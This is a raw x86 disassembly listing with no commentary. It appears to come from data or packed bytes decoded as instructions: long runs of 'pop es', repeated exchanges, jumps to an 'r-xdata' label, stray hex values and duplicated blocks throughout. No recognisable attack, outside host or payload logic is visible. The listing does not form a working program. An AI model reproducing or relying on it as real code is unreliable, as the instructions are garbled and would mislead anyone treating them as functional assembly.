jg r-xdata
inc esi
push 0x7070768
pop es
imul ebp [ eax + 0x68 ] 0x7e
push ecx
pushfd
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
xor [ ecx + 0x68 ] cl
push 0x7070707
pop es
pop es
pop es
int1
push ds
0x1c7b
jns r-xdata
cmpsd [ cs : esi ] [ edi ]
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0x96
sbb al 0xd7
fwait
sbb al 0xd7
fwait
jle r-xdata
pop es
pop es
jle r-xdata
sahf
xchg edi eax
xchg edi eax
cwde
adc esi [ ecx + 0x73 ]
push 0x744c7e68
push 0x79cc7f68
push 0x9b531468
scasb [ edi ]
in al dx
stosd [ edi ]
cwde
adc cl [ ebp + esi * 2 + 0x68 ]
push 0x684ab77e
push 0x4be268c4
sbb al 0x4e
jle r-xdata
push 0x7070707
pop es
[ ebx + 0x1ecfb49d ]
pop es
pop es
into
sbb dl dl
jae r-xdata
inc edi
push 0x7070768
xchg edi eax
xchg edi eax
mov esi 0x7686855
pop es
pop es
retn 0x7b1c
lahf
int1
push ds
fisubr [ edi + 0x7f ]
retn
push 0x97a6e17e
xchg edi eax
jg r-xdata
jle r-xdata
jns r-xdata
jle r-xdata
and ebp [ eax + 0x68 ]
jle r-xdata
sti
sti
mov ecx 0xf36bd250
sti
sti
xchg edi eax
jle r-xdata
pop ebp
push 0x6beaae68
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
push 0x978b657f
xchg edi eax
adc al 0x53
sbb al 0xd2
jle r-xdata
adc [ edi + 0x7070797 ] 0x7
pop es
pop es
pop es
push ebx
mov edi 0x7079797
pop es
pop es
lodsb [ esi ]
push esp
jle r-xdata
pop es
pop es
int1
adc dl [ edi - 0x68 ]
adc esi esp
sub eax 0x457e6868
jno r-xdata
sub ch [ eax + 0x68 ]
pop es
pop es
push ds
0x7e6b
push edi
pop es
adc al 0x6f
xlat
cwde
adc eax 0x97979405
jpo r-xdata
pop edi
push 0x68
push 0x4a907ec7
push 0x7070768
int1
push ds
push 0x68070707
and [ ebx - 0x69 ] dl
xchg edi eax
xchg edi eax
xchg edi eax
pop es
0x7079797 0x707
jle r-xdata
push 0xca1e0768
imul edi [ esi - 0x3f ] 0xffffff8d
xchg edi eax
xchg edi eax
cwde
adc esp [ edi + 0x7e686877 ]
sub eax 0x79797b8
push 0x667e0707
jne r-xdata
shl [ ebx - 0x38a85b2b ] cl
inc ebx
push 0x7b1cc268
jle r-xdata
jle r-xdata
xchg esi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
ror [ ebp + 0x13989797 ] 0xa7
ja r-xdata
push 0xaf7ef2fd
push eax
push 0xd21ef168
jns r-xdata
push 0x7070768
jle r-xdata
js r-xdata
movsb [ edi ] [ esi ]
push edi
xlat
pop esi
push esp
pop es
pop es
pop es
cwde
adc dh [ ebx ]
jno r-xdata
pop es
pop es
cdq
xchg edi eax
xchg edi eax
pop es
into
std
jle r-xdata
jle r-xdata
xchg edi eax
pop es
push 0x97b82d7e
xor esi [ ecx + 0x68 ]
std
int3
sbb bl [ ebx ]
mov bl 0xb
xchg edi eax
xchg edi eax
xchg edi eax
push 0x971797ff
xchg edi eax
std
xchg edi eax
push 0x7e8fb3e3
cmp [ eax + 0x68 ] 0x68
pop es
jle r-xdata
mov ebp 0xd21c9797
pop es
pop es
pop es
pop es
mov dl 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push eax
shr [ ebx - 0x6a ] cl
xchg edi eax
xchg edi eax
xchg edi eax
sbb al 0xd2
imul edi [ esi - 0x80 ] 0xffffff8b
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl al
xchg esi eax
jle r-xdata
imul edx [ esi + 0x1c979797 ] 0xffffffd2
jns r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
push 0x121abfc1
push 0x7070707
std
mov [ 0xffffffffca1ef1cc ] eax
lahf
jle r-xdata
push 0x7b1c0707
push 0x68c48bc0
loop r-xdata
and [ eax + 0x68 ] ebp
pop es
jle r-xdata
int3
jo r-xdata
push 0xf1070707
push 0x97970f00
les edi [ esi + 0x8 ]
inc ebp
push 0x1a070768
sbb ch [ edi + 0x6a ]
push 0xb0717e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
sbb al 0x47
jle r-xdata
insb
push 0x817e0768
push 0x7070768
pop es
push 0x6a391398
push 0x97087e68
xchg edi eax
xchg edi eax
lodsb [ esi ]
shr [ edi + 0x7e ] cl
jbe r-xdata
push 0x6d2b121a
push 0x6139868
lahf
xchg edi eax
xchg edi eax
jle r-xdata
mov [ edi - 0xe1e0269 ] edx
push ds
shl [ edi + 0x7e ] cl
in eax dx
push 0x7070768
pop es
pop es
pop es
std
xchg edi eax
jle r-xdata
adc dh cl
or [ eax + 0x68 ] ebp
push cs
jle r-xdata
jl r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push ds
shl [ ebp - 0x31 ] cl
jle r-xdata
xchg ebp eax
xchg edi eax
xchg edi eax
cwde
adc [ edi + edx * 4 - 0x35e16869 ] edx
xchg edi eax
jle r-xdata
ror [ ebx + 0x7fe268c4 ] 0x68
add [ edi ] cl
xchg edi eax
xchg edi eax
push 0x53140768
fwait
jle r-xdata
imul edi [ esi + 0x26 ] 0x57
imul ebp [ eax + 0x68 ] 0x7
pop es
jle r-xdata
pop es
jg r-xdata
push 0x7070768
pop es
jle r-xdata
pop es
sbb al 0x7b
mov [ edi + 0x51140797 ] edx
xchg ebp eax
jle r-xdata
push 0x597f0768
push edi
jle r-xdata
jle r-xdata
pop es
pop es
pop es
push 0x7070707
mov ebp 0x68079797
loope r-xdata
iretd
insd
push 0x7070768
push 0xd21cc3e1
lahf
jle r-xdata
pop es
dec ebx
push 0x60137e68
push 0x7070768
int1
pop es
pop es
pop es
and ebp [ eax + 0x68 ]
pop es
pop es
pop es
std
stc
sbb al 0x4d
int1
push ds
0xcc95
push 0x3d21a68
mov ah 0x97
xchg edi eax
pop es
jno r-xdata
std
idiv [ esi + 0x4 ]
xchg edx eax
push 0x92977e07
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
arpl [ esi - 0x3f976869 ] dx
lahf
push 0x7e9fb3e3
and dh [ ebp + 0x68 ]
push ds
shl [ ebx + 0x7e ] cl
cmp bh [ edx + 0x7079797 ]
pop es
pop es
pop es
pop es
cwde
adc bh [ eax ]
push ebp
popad
push 0xd21c0768
outsd
push ds
sar [ ebx + 0x1c ] cl
shl [ ebx + 0x1e ] cl
shl [ edi + 0x7e ] cl
fidivr [ esi + 0x68 ]
push 0x7070707
pop es
pop es
std
jecxz r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
sbb dl [ edx ]

pop es
pop es
pop es
pop es
pop es
les edi [ esi + 0x35 ]
cdq
xchg edi eax
xchg edi eax
jle r-xdata
xchg edx eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push [ eax - 0x70 ]
pop ss
bound edi [ esi - 0x46 ]
mov ah 0x97
xchg edi eax
jge r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf16d1c2f 0xea1e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
sbb bl [ edx ]
outsd
push 0x68
push 0x685ade7f
push 0x972b111c
xchg edi eax
xchg edi eax
jle r-xdata
pop es
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
pop es
pop es
pop es
jbe r-xdata
jle r-xdata
and [ eax + 0x68 ] ebp
pop es
pop es
sbb al 0x69
jle r-xdata
inc ecx
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push edx
jecxz r-xdata
jle r-xdata
sbb al 0xe7
stosd [ edi ]
jle r-xdata
inc esp
push 0x1ef10768
0xc8f0fd7b 0x1ef1
enter 0xccc9 0x7e
and eax 0x7979797
pop es
pop es
jle r-xdata
out 0x6d eax
push 0x7070768
pop es
pop es
pop es
pop es
les edi [ esi + 0xe ]
pop edi
push 0x7070768
pop es
pop es
push esp
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ ecx ]
jns r-xdata
pushad
push 0x7070768
push 0x27907e44
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
push 0xfd7e0707
pop es
pop es
pop es
int1
push ds
0xcc4b
push 0x9787917e
xchg edi eax
adc dl [ edi + 0x7e ]
xlat
sub_48fc1e
sub eax 0x7ec8e2fd
or al 0x83
xchg edi eax
xchg edi eax
pop es
push 0x97971701
xchg edi eax
push ds
shr [ edi + 0x7e ] cl
test [ edx + 0x68 ] edi
push 0x7e9b5314
insd
and [ eax + 0x68 ] ch
pop es
pop es
sbb al 0x50
jge r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf16d1c2f 0xea1e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
sbb bl [ edx ]
outsd
push 0x68
push 0x685ade7f
push 0x972b111c
xchg edi eax
xchg edi eax
jle r-xdata
pop es
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
pop es
pop es
pop es
jbe r-xdata
jle r-xdata
and [ eax + 0x68 ] ebp
pop es
pop es
sbb al 0x69
jle r-xdata
inc ecx
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
push edx
jecxz r-xdata
jle r-xdata
sbb al 0xe7
stosd [ edi ]
jle r-xdata
inc esp
push 0x1ef10768
0xc8f0fd7b 0x1ef1
enter 0xccc9 0x7e
and eax 0x7979797
pop es
pop es
std
jecxz r-xdata
jle r-xdata
out 0x6d eax
push 0x7070768
pop es
pop es
pop es
pop es
les edi [ esi + 0xe ]
pop edi
push 0x7070768
pop es
pop es
push esp
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ ecx ]
jns r-xdata
pushad
push 0x7070768
push 0x27907e44
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070707
push 0xfd7e0707
pop es
pop es
pop es
int1
push ds
0xcc4b
push 0x9787917e
xchg edi eax
adc dl [ edi + 0x7e ]
xlat
sub_48fca5
adc al 0x7b
cmpsd [ esi ] [ edi ]
std
cmc
push edx
jecxz r-xdata
jle r-xdata
out 0x6d eax
push 0x7070768
pop es
pop es
pop es
pop es
les edi [ esi + 0xe ]
pop edi
push 0x7070768
pop es
pop es
push esp
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc esi [ ecx ]
jns r-xdata
pushad
push 0x7070768
push 0x27907e44
push 0x7070768
pop es
pop es
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
int1
push ds
0xcc4b
push 0x9787917e
xchg edi eax
adc dl [ edi + 0x7e ]
xlat
jle r-xdata
and [ eax + 0x68 ] ebp
pop es
pop es
sbb al 0x69
jle r-xdata
sbb al 0xe7
stosd [ edi ]
jle r-xdata
inc esp
push 0x1ef10768
0xc8f0fd7b 0x1ef1
enter 0xccc9 0x7e
and eax 0x7979797
pop es
pop es
std
jecxz r-xdata
jle r-xdata
jge r-xdata
push 0xfd7e0707
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0xf16d1c2f 0xea1e
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
push 0x97973b01
xchg edi eax
sbb bl [ edx ]
outsd
push 0x68
push 0x685ade7f
push 0x972b111c
xchg edi eax
xchg edi eax
jle r-xdata
pop es
jle r-xdata
pop ebx
push 0x7070768
pop es
pop es
movsb [ edi ] [ esi ]
push edi
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
retn 0x7b1c
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
jbe r-xdata
inc ecx
xchg [ edi + 0x7070797 ] dl
pop es
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
sub_48fe32
push 0xe268c3e1
lahf
push 0xc07e6be2
pop esp
push 0x7070768
pop es
pop es
pop es
pop es
cwde
sbb [ edi + 0x7e9797be ] esp
jmp r-xdata
jae r-xdata
mov esi 0xeb7e9797
ror [ ebx + 0x1cbfd91c ] 0xd2
outsd
jle r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
adc bl [ esi + 0x7e ]
mov edi 0x79797bd
pop es
cwde
adc dl [ edx + 0x51979797 ]
shl [ ebx - 0x14516879 ] cl
mov bl 0xa3
jle r-xdata
mov bl 0x97
cmp [ eax + 0x68 ] ch
scasb [ edi ]
shl [ ebx - 0x6cec6775 ] cl
xchg edi eax
xchg edi eax
xchg edi eax
shr [ eax - 0x3f ] 0x9f
jle r-xdata
nop
xchg edi eax
xchg edi eax
jg r-xdata
lahf
xchg edi eax
xchg edi eax
jle r-xdata
arpl [ eax + 0x68 ] bp
jg r-xdata
push eax
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc dh bh
mov esp 0x9c7e9797
adc [ edi - 0x36460269 ] 0x7e
sub eax 0xf197979e
push ds
retn 0x7e4d
sub al 0x68
push 0x205c7e07
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
push edi
push 0x7070768
pop es
pop es
jg r-xdata
cmp [ eax + 0x68 ] ebp
into
jle r-xdata
xchg edi eax
jle r-xdata
xchg edi eax
push edi
push 0x7070768
pop es
pop es
pop es
iretd
iretd
jo r-xdata
pop es
pop es
sub [ eax + 0x68 ] ch
pop es
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
push 0x7e87d21c
sbb [ eax + ebp * 2 + 0x68 ] 0x7
iretd
pop es
pop es
sbb dl [ ebx ]
mov bl 0x7
sub ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x12671c44
popad
jle r-xdata
lodsd [ esi ]
lahf
xchg edi eax
pop es
pop es
pop es
sbb al 0x50
jle r-xdata
mov edi 0x7079797
xchg edi eax
xchg edi eax
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
std
sar [ esi + 0x70 ] cl
push ebx
push 0x7070768
cwde
adc cl [ esp + edx * 4 ]
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
pop es
pop es
aad 0x7e
or ch [ ebx + 0x68 ]
push 0x13980707
test [ ecx + 0x68 ] ah
push 0x979fad7e
push 0x7070768
pop es
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xlat
jle r-xdata
push 0x93ff0768
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]

xchg edi eax
les edi [ esi + 0x65 ]
push eax
and al 0x68
pop es
std
iretd
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shr [ ebx - 0x5c ] cl
push edi
int1
push ds
shr [ ecx - 0x1 ] cl
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]
daa
push 0x68
push 0x97b6017e
xchg edi eax
pop es
pop es
pop es
push 0x97971300
sub al 0x68
push 0x7ec90707
pop edx
cmp [ eax + 0x68 ] ebp
movsb [ edi ] [ esi ]
push 0x6824357e
sub_48fee8
push 0x223b7e68
push 0xb32a7e68
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
aad 0x7e
or ch [ ebx + 0x68 ]
push 0x13980707
test [ ecx + 0x68 ] ah
push 0x979fad7e
push 0x7070768
pop es
xchg edi eax
pop es
pop es
jle r-xdata
lodsd [ esi ]
lahf
xchg edi eax
mov edi 0x7079797
pop es
pop es
pop es
sbb al 0x50
jle r-xdata
pop es
pop es
sbb dl [ ebx ]
mov bl 0x7
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
sub ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push 0x12671c44
popad
jle r-xdata
xchg edi eax
xchg edi eax
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
std
sar [ esi + 0x70 ] cl
push ebx
push 0x7070768
cwde
adc cl [ esp + edx * 4 ]
xchg edi eax
xchg edi eax
jle r-xdata
jle r-xdata
xchg esp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xlat
jle r-xdata
push 0x93ff0768
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]

xchg edi eax
les edi [ esi + 0x65 ]
push eax
and al 0x68
pop es
std
iretd
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
shr [ ebx - 0x5c ] cl
push edi
int1
push ds
shr [ ecx - 0x1 ] cl
xchg ebx eax
xchg esi eax
xchg edi eax
xchg edi eax
sbb dl [ edx ]
daa
push 0x68
push 0x97b6017e
xchg edi eax
pop es
pop es
pop es
push 0x97971300
sub al 0x68
push 0x7ec90707
pop edx
cmp [ eax + 0x68 ] ebp
movsb [ edi ] [ esi ]
push 0x6824357e
sub_48ffb6
push 0x68
push 0x6857c77e
push 0x2b7e7b1c
sbb al 0x7b
jle r-xdata
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
std
iretd
jle r-xdata
inc esi
push 0x7070768
pop es
jle r-xdata
push 0xc7a3d11a
sub_48fff0
xchg edi eax
xchg edi eax
pop es
pop es
pop es
int1
push ds
rol [ ebx - 0x32070231 ] cl
jle r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
jle r-xdata
lahf
jg r-xdata
dec eax
push 0x47e0768
push eax
jle r-xdata
mov dl [ edi + 0x6a937e97 ]
push 0xbf3c7f68
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc edx [ ebx + 0x1e979797 ]
jmp r-xdata
push 0x7e070768
loope r-xdata
test [ edi - 0x64308169 ] edx
push edi
jle r-xdata
jle r-xdata
scasd [ edi ]
pop ecx
push 0x7070768
pop es
pop es
pop es
pop es
std
iretd
xchg edi eax
jle r-xdata
push 0x7070768
pop es
pop es
pop esi
push esp
pop es
pop es
pop es
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
push ebp
push 0x967e0768
add al 0x50
jg r-xdata
outsd
push 0xd21ef168
jae r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
std
fwait
jpo r-xdata
push 0xd21ef107
cmp [ esi + 0x44 ] 0x6868682a
loop r-xdata
pop ebp
sbb eax 0xcf686820
jle r-xdata
adc eax edx
jle r-xdata
adc edi [ eax + ebp * 2 ]
push 0x684eca7e
push 0x6826b97f
push 0x6843db7e
push 0x7070707
push 0x7070768
sbb al 0x4d
jle r-xdata
pop ecx
push 0x7e070768
fcomp [ edx + 0x7079797 ]
pop es
pop es
pop es
cwde
std
mov bh 0x7e
aas
push 0x97872a7e
xchg edi eax
pop es
rcr [ esi ] 0xd1
stosd [ edi ]
jg r-xdata
adc dl [ edi + 0x7e ]
mov [ 0x7686855 ] al
pop es
jle r-xdata
sub [ eax + 0x68 ] ch
pop es
pop ds

cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
jle r-xdata
pop edi
push 0x7070768
pop es
pop es
pop es
pop ds
shl [ edi + 0x1f ] cl
rol [ edi + 0x7e ] cl
xchg ebx eax
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc dl [ esi + 0x68 ]
push 0x968be814
jle r-xdata
push ebx
push 0x7070768
pop es
push 0x68
push 0x6867cd7e
push 0xfd9b7b14
lahf
jle r-xdata
mov [ edi + 0x7070797 ] ss
pop es
pop es
pop es
sbb al 0x7b
pop es
pop es
pop es
pop es
pop es
push 0x7070768
jne r-xdata
pop es
pop es
int1
push ds
retn 0x7ead
dec esp
jle r-xdata
xchg [ edi + 0x7070797 ] dl
into
adc dl [ edi - 0x68 ]
adc ecx [ eax + 0x7e9797be ]
or cl [ edi + edx * 4 - 0x67f8f869 ]
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
0x754
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
pop es
push 0xb7fd0768
jle r-xdata
xchg [ edi + 0x1ec00797 ] edx
shr [ ebx + 0x6875607f ] 0x1
and [ eax + 0x68 ] ch
iretd
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
push 0x939f26ff
pushad
rcr [ esi ] 0xd1
xlat
jle r-xdata
push 0x686a177e
push 0xd2500707
pop ebx
adc eax [ esi + 0x41 ]
push 0x6a177e68
push 0x50070768
rcr [ ebx - 0x1 ] cl
out dx al
out 0xf2 eax
jle r-xdata
mov [ edi - 0x67f8f869 ] ss
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x7e571268
xor al 0x86
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7ec4c7c0
xor ah [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
pop es
sbb al 0x49
int1
push ds
0x1c6d
lea edx [ edi + 0x7070797 ]
sbb al 0xd2
imul edi [ esi - 0x3e ] 0x45
push 0x7070768
pop es
pop es
pop es
pop es
pop es
std
pop es
pop es
pop es
int1
push ds
fimul [ edi - 0x32 ]
std
adc [ edi - 0x38f8f869 ] 0x7e
mov edi 0x79797b7
std
xchg ebx eax
jle r-xdata
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
sbb al 0x97
jle r-xdata
jo r-xdata
inc ebx
push 0x7070768
jle r-xdata
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
int1
push ds
0x1c69
and [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb bl [ edx ]
daa
sub_49001e
add ecx 0x7e
mov eax [ 0x7686875 ]
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
int1
push ds
shr [ ebp + 0x1a ] cl
adc al [ ebx + 0x6a ]
push 0x44267f68
push 0x59717e68
push 0x7070768
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7ead
sub_49004d
adc bh [ edx + 0x68 ]
push 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0x7ead
dec esp
jg r-xdata
dec eax
push 0x47e0768
push eax
push 0x7e070768
loope r-xdata
test [ edi - 0x64308169 ] edx
push edi
jle r-xdata
jle r-xdata
xchg edi eax
jle r-xdata
push 0x7070768
pop es
pop es
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
pop esi
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
jg r-xdata
push ebp
push 0x967e0768
add al 0x50
jg r-xdata
outsd
push 0xd21ef168
jae r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
std
fwait
jle r-xdata
mov dl [ edi + 0x6a937e97 ]
push 0xbf3c7f68
xchg edi eax
xchg edi eax
adc dl [ edi - 0x68 ]
adc edx [ ebx + 0x1e979797 ]
jmp r-xdata
jpo r-xdata
push 0xd21ef107
cmp [ esi + 0x44 ] 0x6868682a
loop r-xdata
scasd [ edi ]
pop ecx
push 0x7070768
pop es
pop es
pop es
pop es
std
iretd
pop ebp
sbb eax 0xcf686820
jle r-xdata
adc eax edx
jle r-xdata
adc edi [ eax + ebp * 2 ]
push 0x684eca7e
push 0x6826b97f
push 0x6843db7e
push 0x7070707
push 0x7070768
sbb al 0x4d
jle r-xdata
pop ecx
push 0x7e070768
fcomp [ edx + 0x7079797 ]
pop es
pop es
pop es
cwde
std
mov bh 0x7e
aas
push 0x97872a7e
xchg edi eax
pop es
rcr [ esi ] 0xd1
stosd [ edi ]
jg r-xdata
adc dl [ edi + 0x7e ]
mov [ 0x7686855 ] al
pop es
jle r-xdata
sub [ eax + 0x68 ] ch
pop es
pop ds

cmpsd [ esi ] [ edi ]
xchg edi eax
xchg edi eax
jle r-xdata
pop edi
push 0x7070768
pop es
pop es
pop es
pop ds
shl [ edi + 0x1f ] cl
rol [ edi + 0x7e ] cl
xchg ebx eax
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc dl [ esi + 0x68 ]
push 0x968be814
jle r-xdata
push ebx
push 0x7070768
pop es
push 0x68
push 0x6867cd7e
push 0xfd9b7b14
lahf
jle r-xdata
mov [ edi + 0x7070797 ] ss
pop es
pop es
pop es
sbb al 0x7b
pop es
pop es
pop es
pop es
pop es
push 0x7070768
jne r-xdata
jle r-xdata
xchg [ edi + 0x7070797 ] dl
into
adc dl [ edi - 0x68 ]
adc ecx [ eax + 0x7e9797be ]
or cl [ edi + edx * 4 - 0x67f8f869 ]
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
0x754
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
pop es
push 0xb7fd0768
jle r-xdata
xchg [ edi + 0x1ec00797 ] edx
shr [ ebx + 0x6875607f ] 0x1
and [ eax + 0x68 ] ch
iretd
pop es
pop es
pop es
pop es
pop es
pop es
into
jle r-xdata
push 0x939f26ff
pushad
rcr [ esi ] 0xd1
xlat
jle r-xdata
push 0x686a177e
push 0xd2500707
pop ebx
adc eax [ esi + 0x41 ]
push 0x6a177e68
push 0x50070768
rcr [ ebx - 0x1 ] cl
out dx al
out 0xf2 eax
jle r-xdata
mov [ edi - 0x67f8f869 ] ss
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x7e571268
xor al 0x86
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7ec4c7c0
xor ah [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
pop es
sbb al 0x49
int1
push ds
0x1c6d
lea edx [ edi + 0x7070797 ]
sbb al 0xd2
imul edi [ esi - 0x3e ] 0x45
push 0x7070768
pop es
pop es
pop es
pop es
pop es
std
pop es
pop es
pop es
int1
push ds
fimul [ edi - 0x32 ]
std
adc [ edi - 0x38f8f869 ] 0x7e
mov edi 0x79797b7
std
xchg ebx eax
jle r-xdata
jle r-xdata
dec ebp
push 0x7070768
pop es
pop es
pop es
pop es
pop es
sbb al 0x97
jle r-xdata
jo r-xdata
inc ebx
push 0x7070768
jle r-xdata
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
dec esp
int1
push ds
0x1c69
and [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb bl [ edx ]
daa
sub_490200
push 0x7070768
pop es
pop es
cwde
adc dl [ esi + 0x68 ]
push 0x968be814
jle r-xdata
into
adc dl [ edi - 0x68 ]
adc ecx [ eax + 0x7e9797be ]
or cl [ edi + edx * 4 - 0x67f8f869 ]
adc eax [ esi + 0x41 ]
push 0x6a177e68
push 0x50070768
rcr [ ebx - 0x1 ] cl
out dx al
out 0xf2 eax
jle r-xdata
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xd2
lahf
0x754
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x7e571268
xor al 0x86
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7ec4c7c0
xor ah [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
pop es
sbb al 0x49
int1
push ds
0x1c6d
lea edx [ edi + 0x7070797 ]
sbb al 0xd2
imul edi [ esi - 0x3e ] 0x45
push 0x7070768
pop es
pop es
pop es
pop es
pop es
std
sub_4902eb
cmpsd [ esi ] [ edi ]
cwde
adc esp edx
mov edi 0xfc7e9797
mov edi 0x7079797
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push ds
and al [ edi + 0x6a ]
push 0x7e571268
xor al 0x86
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x7ec4c7c0
xor ah [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
pop es
sbb al 0x49
int1
push ds
0x1c6d
sub_49032d
das
jpe r-xdata
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
push 0x4d7f0707
cmp [ eax + 0x68 ] ch
adc al 0x53
fwait
push ds
pop es
pop es
pop es
sbb dl bl
xchg [ edi + 0x7e ] eax
and eax 0x7686847
int1
pop eax
push 0x5ec9c868
push esp
pop es
pop es
pop es
pop es
pop es
jg r-xdata
jle r-xdata
inc ebp
push 0x1a070768
fimul [ ebx + 0x7f ]
in eax dx
inc edi
push 0x713e7e68
push 0xc0070768
sbb al 0x6f
sbb dl [ edx ]
jpo r-xdata
shl [ ebx + 0x7e57128f ] cl
mov ss [ fs : edi + 0x12980797 ]
